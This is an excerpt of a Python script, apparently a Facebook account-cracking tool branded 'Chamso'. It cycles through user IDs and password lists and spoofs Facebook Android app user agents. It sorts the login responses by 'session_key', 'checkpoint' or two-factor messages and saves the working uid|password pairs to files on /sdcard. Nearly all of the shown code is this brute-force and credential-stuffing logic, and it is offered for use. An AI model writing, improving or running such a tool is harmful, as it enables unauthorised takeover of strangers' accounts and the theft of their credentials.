...
logo=("""
        __                             
  _____/ /_ ____ _____ ___ _________
 / ___/ __ \/ __ `/ __ `__ \/ ___/ __ \
 / /__/ / / / /_/ / / / / / (__ ) /_/ /
 / /__/ / / / /_/ / / / / / (__ ) /_/ /
\____/_/ /_/\__,_/_/ /_/ /_/____/\____/
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : Chamso
\x1b[1;97m> Github : https://github.com/larbihannachi24/Chamso24
\x1b[1;97m> Facebok: Chamso
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [Chamso-OK] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/Chamso/Chamso-OK.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif 'checkpoint' in response.text:
                print('\r{}\033[1;91m[Checkpiont] {} {} {} {}'.format(G, url, fax, px, mys))
                cpu.append(url)
                open('/sdcard/Chamso/Chamso-CP.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[2F-Chamso] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/Chamso/Chamso-2F.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r{} [Chamso-XD] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[Chamso-XD] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Chamso-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Chamso/Chamso-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/Chamso/Chamso-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/Chamso.txt \033[0;97m\n')
